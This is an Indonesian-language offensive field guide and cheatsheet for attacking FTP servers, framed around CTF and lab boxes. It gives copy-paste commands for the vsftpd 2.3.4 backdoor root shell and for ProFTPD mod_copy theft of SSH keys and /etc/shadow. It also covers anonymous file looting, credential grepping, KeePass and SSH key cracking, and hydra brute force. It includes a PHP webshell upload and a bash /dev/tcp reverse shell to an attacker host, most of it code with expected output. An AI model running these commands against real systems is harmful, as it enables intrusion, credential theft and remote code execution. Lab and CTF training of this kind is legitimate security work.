### 📝 EXAMPLE 2: vsftpd 2.3.4 Backdoor ➔ Instant Root Shell

**Target**: Metasploitable 2 / Legacy CTF Box

#### Step 1: Banner Grabbing
```bash
nc -vn $TARGET 21
```
```text
(UNKNOWN) [10.10.11.50] 21 (ftp) open
220 (vsFTPd 2.3.4)
```

#### Step 2: Trigger Backdoor Secara Manual
```bash
# Terminal 1: Kirim trigger senyum :)
python3 -c 'import socket; s=socket.socket(); s.connect(("10.10.11.50", 21)); s.send(b"USER exploit:)\r\n"); s.send(b"PASS pass123\r\n")'
```

#### Step 3: Sambungkan Netcat ke Port Backdoor 6200
```bash
nc -vn $TARGET 6200
```
```text
(UNKNOWN) [10.10.11.50] 6200 (?) open
id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 x86_64 GNU/Linux
```

---

### 📝 EXAMPLE 3: ProFTPD 1.3.5 `mod_copy` ➔ Web Shell Execution

**Target**: HTB Kenobi Style Box

#### Step 1: Identifikasi Versi ProFTPD & Webroot
```bash
nc -vn $TARGET 21
# Output: 220 ProFTPD 1.3.5 Server (Debian)
curl -s -I http://$TARGET/
# Output: HTTP/1.1 200 OK (Apache/2.4.25 Debian) -> Webroot di /var/www/html
```

#### Step 2: Salin File SSH Key Menggunakan SITE CPFR / CPTO
```bash
nc -vn $TARGET 21
```
```text
220 ProFTPD 1.3.5 Server
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/www/html/id_rsa
250 Copy successful
QUIT
221 Goodbye.
```

#### Step 3: Unduh Private Key dari Web Server & Login SSH
```bash
wget http://$TARGET/id_rsa -O id_rsa_kenobi
chmod 600 id_rsa_kenobi
ssh -i id_rsa_kenobi kenobi@$TARGET
```
```text
kenobi@kenobi:~$ whoami
kenobi
```

---

## ⚡ BAGIAN 9: CHEATSHEET FTP (COPY-PASTE READY)

Gunakan variabel environment berikut di terminal Parrot OS Anda:

```bash
export TARGET="10.10.11.200"
export USER="ftpuser"
export PASS="password123"
```

```bash
# ==========================================
# 1. RECON & BANNER GRABBING
# ==========================================
nc -vn $TARGET 21                                        # Raw banner grabbing
nmap -sV -p 21 --script banner,ftp-syst $TARGET          # Version & capabilities check
nmap -p 21 --script ftp-anon $TARGET                     # Check anonymous access

# ==========================================
# 2. ANONYMOUS ACCESS & BATCH DOWNLOAD
# ==========================================
ftp -p $TARGET                                           # Connect interactively (Passive mode)
curl -s ftp://anonymous:anonymous@$TARGET/               # List root directory non-interactively
wget -m --no-passive-ftp --no-parent -P ./ftp_loot/ ftp://anonymous:anonymous@$TARGET/ # Mirror all files via wget
lftp -u 'anonymous,anonymous' $TARGET -e "mirror --parallel=5 / ./ftp_loot/; quit" # Multithreaded loot mirror

# ==========================================
# 3. INTERACTIVE FTP COMMANDS
# ==========================================
# binary                                                 # Switch to binary transfer mode
# passive                                                # Force passive data connection
# prompt                                                 # Disable interactive yes/no prompts
# mget *                                                 # Download all files in current directory
# put webshell.php                                       # Upload webshell to target

# ==========================================
# 4. EXPLOITATION
# ==========================================
# vsftpd 2.3.4 Backdoor (Port 6200 Trigger):
# Telnet/NC to 21 -> USER test:) -> PASS test -> nc -vn $TARGET 6200

# ProFTPD 1.3.5 mod_copy (Arbitrary File Copy):
# NC to 21 -> SITE CPFR /source/file -> SITE CPTO /var/www/html/dest_file

# ==========================================
# 5. BRUTEFORCE & SPRAYING
# ==========================================
hydra -l $USER -P /usr/share/wordlists/rockyou.txt $TARGET ftp -t 4 -f -V
nxc ftp $TARGET -u users.txt -p passwords.txt --continue-on-success
```

---

# [07. FTP & FTPS Exploitation Workflow — Master Field Guide](/docs/ftp) — FTP & FTPS Complete Attack Workflow

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"
export LPORT="4444"
export USER="anonymous"
export PASS="anonymous"
export LOOT_DIR="$HOME/ftp_loot"
mkdir -p $LOOT_DIR/{files,creds,keys}
cd $LOOT_DIR

echo "[*] Target: $TARGET | LHOST: $LHOST | LOOT: $LOOT_DIR"
```

**Output yang diharapkan:**

text

```
[*] Target: 10.10.11.200 | LHOST: 10.10.14.5 | LOOT: /home/user/ftp_loot
```

---

## ═══════════════════════════════════════

## FASE 0: BANNER GRABBING & VERSION DETECTION

## ═══════════════════════════════════════

> **Tujuan:** Ambil banner mentah dari port 21 untuk menentukan versi EXACT software FTP dan petakan ke CVE database. **BANNER ≠ VULNERABILITY PROOF** — selalu verifikasi dulu.

### Langkah 0.1 — Raw Banner Grab (Tercepat)

Bash

```
# Command 1: Raw banner via Netcat (paling cepat, no overhead)
nc -vn $TARGET 21

# Command 2: Nmap service version + capabilities
nmap -sV -p 21 --script banner,ftp-syst $TARGET -oN $LOOT_DIR/nmap_ftp.txt

# Command 3: Scan menyeluruh termasuk port FTPS 990
nmap -sV -p 21,990 --script ftp-anon,ssl-cert $TARGET
```

**OUTPUT BERHASIL ✅ — vsftpd 2.3.4 (KRITIS!):**

text

```
(UNKNOWN) [10.10.11.200] 21 (ftp) open
220 (vsFTPd 2.3.4)
```

➡️ **ALARM MERAH!** vsftpd 2.3.4 = kandidat backdoor CVE-2011-2523.  
➡️ **Lanjut ke Langkah 0.2 untuk verifikasi, lalu PATH A jika confirmed.**

**OUTPUT BERHASIL ✅ — ProFTPD 1.3.5:**

text

```
(UNKNOWN) [10.10.11.200] 21 (ftp) open
220 ProFTPD 1.3.5 Server (Debian) [10.10.11.200]
```

➡️ Kandidat CVE-2015-3306 (mod_copy). Lanjut **Langkah 0.2**, lalu cek **PATH B**.

**OUTPUT BERHASIL ✅ — Microsoft FTP / IIS:**

text

```
220 Microsoft FTP Service
```

➡️ Target Windows IIS FTP. Fokus ke enumerasi anonymous dan file loot. Lanjut **Langkah 0.2**.

**OUTPUT BERHASIL ✅ — FileZilla / Generic modern:**

text

```
220-FileZilla Server 0.9.60 beta
220 Welcome
```

➡️ Perlu exact version mapping ke CVE. Catat versi, lanjut **Langkah 0.2**.

**OUTPUT BERHASIL ✅ — Nmap ftp-syst detail:**

text

```
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 2.3.4
| ftp-syst:
|   STAT:
|   FTP server status:
|     Connected to 10.10.14.5
|     Logged in as ftp
|     TYPE: ASCII
|     vsFTPd 2.3.4 - secure, fast, stable
|_  End of status
```

**Mapping Versi → CVE (Referensi Cepat):**

|Banner|CVE|Dampak|
|---|---|---|
|`220 (vsFTPd 2.3.4)`|CVE-2011-2523|Root Shell via Port 6200 backdoor|
|`220 ProFTPD 1.3.5 Server`|CVE-2015-3306|Unauthenticated file copy (mod_copy)|
|`220 ProFTPD 1.3.3c Server`|CVE-2010-4221|Stack Overflow / Telnet IAC RCE|
|`220-FileZilla Server 0.9.x`|CVE-2012-0002|Directory Traversal|
|Modern / patched|Tidak ada direct exploit|Enumerasi normal|

**OUTPUT GAGAL ❌ — Connection refused:**

text

```
nc: connect to 10.10.11.200 port 21 (tcp) failed: Connection refused
```

➡️ FTP mungkin mati atau di port non-standar:

Bash

```
# Scan full port untuk cari FTP di port non-standar
nmap -Pn -p 21,990,2121,8021 $TARGET
# Atau full scan
nmap -Pn -p- --min-rate 1000 $TARGET | grep "ftp\|open"
```

**OUTPUT GAGAL ❌ — TLS disconnect setelah banner:**

text

```
220 Service ready
Connection closed by foreign host.
```

➡️ Server minta TLS (FTPS). Lanjut ke **Langkah 0.4 — FTPS Detection**.

---

### Langkah 0.2 — Verifikasi CVE Kandidat (Jika Banner Match)

> **Hanya jalankan jika banner vsftpd 2.3.4 atau ProFTPD 1.3.5 terdeteksi.**

Bash

```
# Untuk vsftpd 2.3.4 — verifikasi backdoor
nmap -p 21 --script ftp-vsftpd-backdoor $TARGET

# Untuk ProFTPD — cek mod_copy SITE commands
nc -vn $TARGET 21
# Di dalam nc, ketik:
SITE CPFR /etc/passwd
# Lihat response, lanjut jika 350
```

**OUTPUT BERHASIL ✅ — vsftpd VULNERABLE:**

text

```
PORT    STATE SERVICE
21/tcp  open  ftp
| ftp-vsftpd-backdoor:
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2011-2523
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root) groups=0(root)
```

➡️ **JACKPOT! Langsung ke PATH A — EternalBlue... eh, vsftpd Backdoor.**

**OUTPUT ✅ — vsftpd Not Vulnerable:**

text

```
| ftp-vsftpd-backdoor:
|_  The target is not vulnerable to the vsFTPd 2.3.4 backdoor.
```

➡️ Versi sudah di-patch. Skip PATH A, lanjut ke **Langkah 0.3 — Anonymous Check**.

**OUTPUT BERHASIL ✅ — ProFTPD mod_copy aktif:**

text

```
SITE CPFR /etc/passwd
350 File or directory exists, ready for destination name.
```

➡️ mod_copy tersedia! Lanjut ke **PATH B**.

**OUTPUT GAGAL ❌ — ProFTPD mod_copy tidak tersedia:**

text

```
SITE CPFR /etc/passwd
500 SITE CPFR not understood.
```

➡️ mod_copy tidak aktif. Lanjut ke **Langkah 0.3 — Anonymous Check**.

---

### Langkah 0.3 — Anonymous Login Check

Bash

```
# Command 1: Automated check via Nmap NSE
nmap -p 21 --script ftp-anon $TARGET

# Command 2: Manual check via ftp client (passive mode)
ftp -p $TARGET
# Username: anonymous
# Password: anonymous  (atau kosong)

# Command 3: Non-interaktif via curl
curl -s "ftp://anonymous:anonymous@$TARGET/" --list-only
```

**OUTPUT BERHASIL ✅ — Anonymous allowed:**

text

```
PORT    STATE SERVICE
21/tcp  open  ftp
| ftp-anon:
|   Anonymous FTP login allowed (FTP code 230)
|   drwxr-xr-x   2 ftp   ftp   4096 Jan 01 10:00 pub
|   -rw-r--r--   1 ftp   ftp    582 Jan 01 10:01 readme.txt
|_  drwxr-xr-x   2 ftp   ftp   4096 Jan 01 10:02 backups
```

➡️ Anonymous login works! **Lanjut ke PATH C — Anonymous Looting** (FASE 1).

**OUTPUT BERHASIL ✅ — Login berhasil tapi LIST hang:**

text

```
230 Login successful.
257 "/" is the current directory.
(HANG setelah ls atau dir)
```

➡️ Data channel bermasalah (Active Mode diblokir firewall/NAT). Fix:

Bash

```
# Di dalam prompt ftp>, aktifkan passive mode:
ftp> passive
ftp> epsv4 off   # Jika hang di EPSV (IPv6 issue)
ftp> ls -la
```

**OUTPUT GAGAL ❌ — Anonymous denied:**

text

```
| ftp-anon:
|   Anonymous FTP login not allowed (FTP code 530)
|_  This is a possible account or configuration issue.
```

atau:

text

```
curl: (67) Access denied: 530
```

➡️ Anonymous diblokir. Coba variasi:

Bash

```
# Coba username 'ftp' (alias anonymous)
ftp -p $TARGET
# Username: ftp
# Password: (kosong)

# Coba anonymous dengan email palsu
curl -u "anonymous:test@test.com" ftp://$TARGET/ --list-only
```

➡️ Jika semua gagal → tidak ada anonymous access → Lanjut **FASE 5 — Brute Force** (setelah enumeration lain) atau **PATH A/B** jika ada CVE.

---

### Langkah 0.4 — FTPS / TLS Detection (Jika Port 21 Butuh TLS)

Bash

```
# Deteksi FTPS
nmap -sV -p 21,990 --script ssl-cert $TARGET

# Test explicit FTPS (AUTH TLS di port 21)
openssl s_client -connect $TARGET:21 -starttls ftp

# Test implicit FTPS (port 990)
openssl s_client -connect $TARGET:990

# Koneksi FTPS via lftp (SSL bypass untuk lab)
lftp -u "anonymous,anonymous" ftp://$TARGET -e "
set ssl:verify-certificate no
set ftp:ssl-force true
ls
bye
"

# Via curl dengan SSL bypass
curl -k --ftp-ssl -u "anonymous:anonymous" ftp://$TARGET/
```

**OUTPUT BERHASIL ✅ — Explicit TLS required:**

text

```
220 ProFTPD Server ready.
530 Must issue AUTH TLS.
```

atau:

text

```
CONNECTED(00000003)
depth=0 CN = ftpserver.local
verify error:num=18:self-signed certificate
```

➡️ Gunakan lftp atau curl dengan `-k` flag. Lanjut dengan FTPS-capable client.

**OUTPUT BERHASIL ✅ — Implicit FTPS port 990:**

text

```
990/tcp open  ftps
```

➡️ Gunakan: `lftp -u "user,pass" ftps://$TARGET`

---

## ═══════════════════════════════════════

## FASE 1: ANONYMOUS LOOTING (PATH C)

## ═══════════════════════════════════════

> **Tujuan:** Download SEMUA file dari FTP server anonymous. Jangan pilih-pilih dulu, download semua, analisis belakangan. **INGAT: Selalu set binary mode sebelum download file non-teks!**

### Langkah 1.1 — Masuk & Set Mode

Bash

```
# Method 1: Interactive FTP (paling reliable)
ftp -p $TARGET

# Di dalam prompt ftp>:
ftp> passive          # Aktifkan passive mode (WAJIB di CTF/VPN)
ftp> binary           # WAJIB: Hindari file corrupt!
ftp> pwd              # Cek current directory
ftp> ls -la           # List SEMUA file termasuk hidden dotfiles
```

**OUTPUT BERHASIL ✅ — Ada file menarik:**

text

```
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode: on.
ftp> ls -la
229 Entering Extended Passive Mode (|||41231|)
150 Here comes the directory listing.
drwxr-xr-x    2 1000     1000         4096 Jan 20 12:40 .
drwxr-xr-x    2 1000     1000         4096 Jan 20 12:40 ..
-rw-r--r--    1 1000     1000          220 Jan 20 12:35 .bash_history
-rw-r--r--    1 1000     1000         2602 Jan 20 12:38 id_rsa
-rw-r--r--    1 0        0             145 Jan 20 12:45 notes.txt
-rw-r--r--    1 0        0           89234 Feb 01 09:20 backup.zip
drwxr-xr-x    2 0        0            4096 Feb 01 09:25 pub
226 Directory send OK.
```

**Prioritas file yang harus di-download (HIGH VALUE TARGETS):**

|File|Kenapa Penting|Tindakan|
|---|---|---|
|`id_rsa`, `id_dsa`, `id_ed25519`|SSH private key|Download + `chmod 600`|
|`authorized_keys`|SSH public keys|Download untuk enumeration|
|`.bash_history`, `.zsh_history`|Command history + leaked passwords|Download + grep|
|`wp-config.php`, `.env`, `web.config`|Database credentials|Download + grep|
|`backup.zip`, `*.tar.gz`, `*.bak`|Backup archives dengan data sensitif|Download + unzip|
|`*.sql`, `*.sqlite`, `*.db`|Database dumps|Download + strings/dump|
|`notes.txt`, `creds.json`, `passwords.xlsx`|Plaintext credentials|Download + baca|

---

### Langkah 1.2 — Download Semua File (3 Metode)

Bash

```
# === METHOD 1: Interactive (untuk file spesifik) ===
ftp> prompt OFF         # Matikan konfirmasi mget
ftp> recurse ON         # Aktifkan recursive download
ftp> mget *             # Download semua file
ftp> quit

# === METHOD 2: wget recursive mirror (recommended untuk batch) ===
wget -m --no-passive-ftp --no-parent \
    -P $LOOT_DIR/files/ \
    ftp://anonymous:anonymous@$TARGET/

# === METHOD 3: lftp multithreaded (paling cepat untuk server besar) ===
lftp -u "anonymous,anonymous" ftp://$TARGET -e "
set ftp:passive-mode yes
mirror --parallel=5 --verbose / $LOOT_DIR/files/
bye
"

# === METHOD 4: curl untuk file spesifik yang sudah diidentifikasi ===
curl -u "anonymous:anonymous" -O ftp://$TARGET/id_rsa
curl -u "anonymous:anonymous" -O ftp://$TARGET/backup.zip
```

**OUTPUT BERHASIL ✅ — Download berhasil:**

text

```
ftp> mget *
getting file \notes.txt of size 145 as notes.txt (3.1 KiB/s) (average 3.1 KiB/s)
getting file \id_rsa of size 2602 as id_rsa (45.2 KiB/s) (average 45.2 KiB/s)
getting file \backup.zip of size 89234 as backup.zip (892.3 KiB/s) (average 892.3 KiB/s)
```

**OUTPUT GAGAL ❌ — Permission denied saat download:**

text

```
550 Permission denied.
```

➡️ File ada tapi tidak bisa dibaca dengan akun current. Catat nama file untuk nanti setelah dapat creds.

**OUTPUT GAGAL ❌ — 425 Failed to establish data connection:**

text

```
425 Failed to establish connection.
```

➡️ Active mode diblokir firewall/VPN:

Bash

```
# Fix: Aktifkan passive mode
ftp> passive
# Atau gunakan flag -p saat connect
ftp -p $TARGET
```

**OUTPUT GAGAL ❌ — 229 EPSV hang:**

text

```
229 Entering Extended Passive Mode (|||41231|)
(HANG)
```

➡️ EPSV (IPv6) bermasalah di jaringan IPv4:

Bash

```
ftp> epsv4 off
ftp> passive
ftp> ls
```

---

### Langkah 1.3 — Analisis File yang Didownload (KRITIS!)

Bash

```
cd $LOOT_DIR/files/

# === CARI CREDENTIALS DI SEMUA FILE TEKS ===
grep -riE "password|passwd|secret|credential|token|api_key" . 2>/dev/null | head -50
grep -riE "user(name)?=" . 2>/dev/null | head -20

# === CARI SSH PRIVATE KEYS ===
grep -rl "BEGIN.*PRIVATE KEY" . 2>/dev/null
grep -rl "BEGIN RSA PRIVATE KEY" . 2>/dev/null
find . -name "id_rsa*" -o -name "id_ed25519*" -o -name "*.key" -o -name "*.pem" 2>/dev/null

# === CARI FILE CONFIG (DATABASE CREDENTIALS) ===
find . -name "*.php" 2>/dev/null | xargs grep -liE "DB_PASS|mysql_connect|password" 2>/dev/null
find . -name ".env" 2>/dev/null -exec cat {} \;
find . -name "wp-config.php" 2>/dev/null -exec cat {} \;

# === CARI DATABASE DUMPS ===
find . \( -name "*.sql" -o -name "*.sqlite" -o -name "*.db" -o -name "*.kdbx" \) 2>/dev/null

# === CARI EMAIL / USERNAME UNTUK SPRAYING ===
grep -rE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" . 2>/dev/null | head -20

# === INSPECT FILE BINARY (jangan lewatkan archive) ===
find . -type f -exec file {} \; | grep -v "ASCII text\|empty"

# === STRINGS DARI SEMUA FILE ===
find . -type f -print0 | xargs -0 strings -n 8 2>/dev/null | grep -iE "pass|secret|key|token"
```

**OUTPUT BERHASIL ✅ — Ketemu plaintext password:**

text

```
./notes.txt: "Maintenance key for user tom: P@ssw0rd2024!"
./pub/config.txt: db_password=SuperSecret123
```

➡️ **SIMPAN DAN VALIDASI:**

Bash

```
export FTP_USER="tom"
export FTP_PASS="P@ssw0rd2024!"
echo "$FTP_USER:$FTP_PASS" >> $LOOT_DIR/creds/found_creds.txt
# → Lanjut ke FASE 4 — Authenticated FTP
# → Test ke service lain: SSH, SMB, WinRM
```

**OUTPUT BERHASIL ✅ — Ketemu SSH private key (id_rsa):**

text

```
./id_rsa
./pub/.ssh/backup_key
```

➡️ **PROSES SSH KEY:**

Bash

```
# Set permission yang benar
chmod 600 $LOOT_DIR/files/id_rsa
cp $LOOT_DIR/files/id_rsa $LOOT_DIR/keys/

# Cek apakah ada passphrase
ssh-keygen -y -f $LOOT_DIR/keys/id_rsa
# Jika minta passphrase → crack dengan john (ke Langkah 1.4)
# Jika langsung keluar public key → TIDAK ada passphrase, langsung pakai

# Siapa user yang cocok? Cek notes.txt atau username dari server
# Coba login SSH
ssh -i $LOOT_DIR/keys/id_rsa tom@$TARGET
ssh -i $LOOT_DIR/keys/id_rsa root@$TARGET
# → Jika berhasil, lanjut ke <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
```

**OUTPUT BERHASIL ✅ — Ketemu .bash_history dengan credentials:**

text

```
./public/.bash_history:mysql -u admin -pMyS3cr3tP@ss
./user/.bash_history:ftp -u ftpadmin:FtpAdm1n2023 192.168.1.10
```

➡️ Simpan semua credentials, test ke semua service yang ada.

**OUTPUT BERHASIL ✅ — Ketemu database backup (.sql / .sqlite):**

text

```
./backup/database_dump.sql
```

Bash

```
# Inspect dump
head -100 ./backup/database_dump.sql | grep -iE "INSERT|password|user"
grep -iE "password|hash" ./backup/database_dump.sql | head -20

# Untuk SQLite
sqlite3 ./backup/app.db ".tables"
sqlite3 ./backup/app.db "SELECT * FROM users;"
```

**OUTPUT BERHASIL ✅ — Ketemu KeePass database (.kdbx):**

text

```
./backup/company_passwords.kdbx
```

Bash

```
# Crack KeePass database
keepass2john ./backup/company_passwords.kdbx > $LOOT_DIR/creds/keepass.hash
hashcat -m 13400 $LOOT_DIR/creds/keepass.hash /usr/share/wordlists/rockyou.txt
john $LOOT_DIR/creds/keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**OUTPUT: Tidak ada yang sensitif:**

text

```
(hanya file kosong, README, atau file tidak relevan)
```

➡️ Cek direktori lain. Cek apakah ada directory dengan write access → **Langkah 1.5**.

---

### Langkah 1.4 — Crack SSH Key Passphrase (Jika key terencrypt)

Bash

```
# Convert SSH key ke format john
ssh2john $LOOT_DIR/keys/id_rsa > $LOOT_DIR/creds/ssh_key.hash

# Crack dengan john
john $LOOT_DIR/creds/ssh_key.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Atau dengan hashcat (-m 22911 untuk id_rsa modern)
hashcat -m 22911 $LOOT_DIR/creds/ssh_key.hash /usr/share/wordlists/rockyou.txt
```

**OUTPUT BERHASIL ✅:**

text

```
id_rsa:strawberry123       (id_rsa)
```

➡️ Passphrase ditemukan! Login SSH:

Bash

```
ssh -i $LOOT_DIR/keys/id_rsa user@$TARGET
# Masukkan passphrase: strawberry123
```

**OUTPUT GAGAL ❌ — john tidak bisa crack:**

text

```
0 password hashes cracked, 0 left
```

➡️ Coba wordlist lain atau rules:

Bash

```
# Dengan rules
john $LOOT_DIR/creds/ssh_key.hash --wordlist=/usr/share/wordlists/rockyou.txt --rules=Best64

# Wordlist yang lebih lengkap
john $LOOT_DIR/creds/ssh_key.hash --wordlist=/usr/share/seclists/Passwords/darkweb2017-top10000.txt

# Google search hint:
# "site:hashcat.net -m 22911" atau
# "[CTF name] ssh key passphrase writeup"
```

➡️ Simpan hash, lanjutkan workflow. Mungkin ada password hint di tempat lain.

---

### Langkah 1.5 — Cek Write Access & Webshell Upload

Bash

```
# Test apakah ada direktori writable
# Buat file test lokal
echo "ftp-write-test" > /tmp/test_probe.txt

# Coba upload ke berbagai lokasi
ftp -p $TARGET << 'EOF'
user anonymous anonymous
passive
binary
put /tmp/test_probe.txt
cd pub
put /tmp/test_probe.txt
quit
EOF
```

**OUTPUT BERHASIL ✅ — Upload berhasil:**

text

```
local: test_probe.txt remote: test_probe.txt
229 Entering Extended Passive Mode (|||42117|)
150 Ok to send data.
226 Transfer complete.
```

➡️ Ada direktori writable! Sekarang test apakah FTP directory adalah webroot:

Bash

```
# Test akses via HTTP
curl -s http://$TARGET/test_probe.txt
curl -s http://$TARGET/pub/test_probe.txt
# Coba port lain
curl -s http://$TARGET:8080/test_probe.txt
```

**OUTPUT BERHASIL ✅ — File accessible via HTTP (FTP = Webroot!):**

text

```
ftp-write-test
```

➡️ **JACKPOT! FTP directory adalah webroot!** Upload webshell:

Bash

```
# Buat PHP webshell
cat > /tmp/shell.php << 'EOF'
<?php
if(isset($_REQUEST['cmd'])){
    echo '<pre>' . htmlspecialchars(shell_exec($_REQUEST['cmd'])) . '</pre>';
}
?>
EOF

# Upload via ftp
ftp -p $TARGET << 'EOF'
user anonymous anonymous
passive
binary
put /tmp/shell.php
quit
EOF

# Test command execution
curl "http://$TARGET/shell.php?cmd=id"
curl "http://$TARGET/shell.php?cmd=whoami"
```

**OUTPUT BERHASIL ✅ — RCE via webshell:**

HTML

```
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
```

➡️ **SHELL DIDAPAT!** Setup listener dan upgrade ke reverse shell:

Bash

```
# Terminal 1: Setup listener
nc -lvnp $LPORT

# Terminal 2: Trigger reverse shell
curl "http://$TARGET/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"

# Jika gagal, coba encode berbeda:
python3 -c "import urllib.parse; print(urllib.parse.quote('bash -c \"bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\"'))"
```

**OUTPUT GAGAL ❌ — HTTP 404 (FTP ≠ Webroot):**

text

```
404 Not Found
```

➡️ FTP writable tapi bukan webroot. Simpan info ini — mungkin berguna untuk:

- Upload file yang dieksekusi scheduled task
- PATH E — SSH authorized_keys injection
- PATH H — Archive processing chain

**OUTPUT GAGAL ❌ — Upload 550 Permission Denied:**

text

```
550 Permission denied.
```

➡️ Anonymous tidak punya write access di direktori ini. Coba direktori lain:

Bash

```
# Coba direktori common yang writable
ftp> cd uploads
ftp> cd tmp
ftp> cd incoming
ftp> put /tmp/test_probe.txt
```

---

## ═══════════════════════════════════════

## FASE 2: PATH A — vsftpd 2.3.4 BACKDOOR EXPLOITATION

## ═══════════════════════════════════════

> **Prasyarat:** Langkah 0.2 mengkonfirmasi VULNERABLE ke CVE-2011-2523.  
> **Mekanisme:** Username yang berakhiran `:)` memicu server membuka backdoor shell di port 6200 sebagai ROOT.

### Langkah 2.1 — Exploitasi Manual (Netcat)

Bash

```
# === TERMINAL 1: Trigger backdoor ===
nc -vn $TARGET 21
```

Setelah connect, ketik PERSIS seperti ini:

text

```
USER pentester:)
PASS anypassword
```

**OUTPUT BERHASIL ✅ — Trigger diterima:**

text

```
(UNKNOWN) [10.10.11.200] 21 (ftp) open
220 (vsFTPd 2.3.4)
USER pentester:)
331 Please specify the password.
PASS anypassword
530 Please login with USER and PASS.
```

➡️ Respon 530 NORMAL — backdoor mungkin sudah di-trigger! Jangan tutup terminal ini.

Bash

```
# === TERMINAL 2: Connect ke backdoor port 6200 ===
nc -vn $TARGET 6200
```

**OUTPUT BERHASIL ✅ — Root shell via backdoor:**

text

```
(UNKNOWN) [10.10.11.200] 6200 (?) open
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
hostname
targetmachine
```

➡️ **ROOT SHELL!** Lanjut ke post-exploitation:

Bash

```
# Stabilize shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# atau
python -c 'import pty; pty.spawn("/bin/bash")'

# Collect info
cat /etc/passwd
cat /etc/shadow
uname -a
ip addr

# Ambil flag
find / -name "root.txt" -o -name "user.txt" 2>/dev/null

# → Lanjut ke <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a> untuk full post-exploitation
```

**OUTPUT GAGAL ❌ — Port 6200 closed/filtered:**

text

```
(UNKNOWN) [10.10.11.200] 6200 (?) : Connection refused
```

➡️ Backdoor tidak terpicu atau diblokir firewall. Diagnosa:

Bash

```
# Verifikasi ulang apakah port 6200 open
nmap -Pn -p 6200 $TARGET

# Coba trigger ulang dengan variasi username
echo -e "USER test:)\nPASS test" | nc -vn $TARGET 21

# Coba Metasploit sebagai alternatif
msfconsole -q -x "
use exploit/unix/ftp/vsftpd_234_backdoor;
set RHOSTS $TARGET;
set RPORT 21;
exploit
"
```

**OUTPUT GAGAL ❌ — Metasploit gagal juga:**

text

```
[*] Exploit completed, but no session was created.
```

➡️ Target sudah di-patch meski banner tidak berubah (custom package). Skip PATH A, lanjut **FASE 3 (PATH B)** atau **FASE 1 (Anonymous Looting)**.

---

## ═══════════════════════════════════════

## FASE 3: PATH B — ProFTPD 1.3.5 MOD_COPY EXPLOITATION

## ═══════════════════════════════════════

> **Prasyarat:** ProFTPD dengan mod_copy aktif (SITE CPFR/CPTO merespon 350).  
> **Mekanisme:** Copy file sensitif dari mana saja di filesystem ke webroot yang bisa diakses HTTP.

### Langkah 3.1 — Identifikasi Webroot

Bash

```
# Cek apakah ada web server
curl -I http://$TARGET/
curl -I http://$TARGET:80/
curl -I http://$TARGET:8080/
nmap -p 80,443,8080,8443 $TARGET --open
```

**OUTPUT BERHASIL ✅ — Web server aktif:**

text

```
HTTP/1.1 200 OK
Server: Apache/2.4.25 (Debian)
Content-Type: text/html
```

➡️ Apache Debian → webroot kandidat: `/var/www/html/`

**Webroot berdasarkan server:**

|Server|Webroot Kandidat|
|---|---|
|Apache Linux|`/var/www/html/`|
|Nginx Linux|`/usr/share/nginx/html/` atau `/var/www/html/`|
|Windows IIS|`C:\inetpub\wwwroot\`|
|XAMPP Windows|`C:\xampp\htdocs\`|

---

### Langkah 3.2 — Copy File Sensitif via mod_copy

Bash

```
# Buka koneksi raw ke FTP server
nc -vn $TARGET 21
```

Setelah terhubung, ketik perintah:

text

```
# Salin SSH key dari user ke webroot
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/www/html/id_rsa_kenobi
QUIT
```

**OUTPUT BERHASIL ✅ — Copy sukses:**

text

```
220 ProFTPD 1.3.5 Server (Debian) [10.10.11.200]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name.
SITE CPTO /var/www/html/id_rsa_kenobi
250 Copy successful.
QUIT
221 Goodbye.
```

Bash

```
# Download file dari web server
wget http://$TARGET/id_rsa_kenobi -O $LOOT_DIR/keys/id_rsa_kenobi
chmod 600 $LOOT_DIR/keys/id_rsa_kenobi

# Login SSH dengan key tersebut
ssh -i $LOOT_DIR/keys/id_rsa_kenobi kenobi@$TARGET
# → Jika berhasil, ke <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
```

**Contoh file lain yang bisa di-copy:**

Bash

```
# /etc/passwd (untuk enumeration user)
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt

# Cek password shadow (butuh root permission, mungkin tidak bisa)
SITE CPFR /etc/shadow
SITE CPTO /var/www/html/shadow.txt

# Config web app
SITE CPFR /var/www/html/wp-config.php
SITE CPTO /var/www/html/wpconfig_backup.txt

# Authorized keys user lain
SITE CPFR /root/.ssh/id_rsa
SITE CPTO /var/www/html/root_id_rsa
```

**OUTPUT GAGAL ❌ — Sumber file tidak ada:**

text

```
SITE CPFR /home/kenobi/.ssh/id_rsa
550 /home/kenobi/.ssh/id_rsa: No such file or directory.
```

➡️ Path salah atau file tidak ada. Coba path lain:

Bash

```
# Enum user dari /etc/passwd dulu
SITE CPFR /etc/passwd
